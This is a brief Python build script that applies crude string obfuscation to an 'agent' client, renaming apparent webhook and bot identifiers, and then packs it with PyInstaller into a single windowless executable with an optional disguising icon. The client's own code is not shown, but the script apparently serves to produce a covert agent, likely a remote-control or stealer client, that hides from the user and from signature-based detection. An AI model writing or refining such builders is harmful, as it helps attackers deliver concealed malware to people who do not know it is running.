import os
import shutil as sh
import subprocess as sub
from pathlib import Path as P

ap = "../agent/client.py"
dist = "dist"
ico = "icon.ico"

pr = print

def obfuscate(input_path, output_path):
    with open(input_path, "r", encoding="utf-8") as f:
        code = f.read()

    obfuscated = code.replace("wbh", "WXZ").replace("bot", "BXZ")

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(obfuscated)

def build():
    temp_agent = "obf_client.py"
    obfuscate(ap, temp_agent)

    if os.path.exists(dist):
        sh.rmtree(dist)

    pyins = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        temp_agent
    ]

    if P(ico).exists():
        pyins += ["--icon", ico]

    sub.run(pyins)

    os.remove(temp_agent)
    sh.rmtree("build", ignore_errors=True)
    sh.rmtree("__pycache__", ignore_errors=True)
    spec_file = P("obf_client.spec")
    if spec_file.exists():
        spec_file.unlink()

    pr(f"[+] Build finished. Check `{dist}/`")

if __name__ == "__main__":
    build()
